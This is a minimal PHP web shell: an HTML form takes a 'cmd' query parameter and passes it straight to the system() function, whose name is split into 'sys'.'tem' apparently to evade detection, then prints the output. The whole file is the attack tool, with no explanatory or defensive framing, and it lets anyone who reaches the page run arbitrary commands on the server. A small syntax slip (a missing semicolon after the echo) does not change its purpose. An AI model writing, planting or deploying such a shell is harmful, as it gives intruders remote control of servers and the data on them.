<html>
    <meta http-equiv="Content-Type" content="text/html; charset=EUC-KR" />
    <body>
        <form method="get">
            <input type="text" name="cmd" size="50">
            <input type="submit" value="Run">
        </form>
        <pre>
            <? header("Content-Type:text/html; charset=EUC-KR");
            if($_GET['cmd'])
            {
                $sys = "sys"."tem";
                $result = $sys($_GET['cmd']);
                echo "{$result}"
            }
            ?>
        </pre>
    </body>
</html>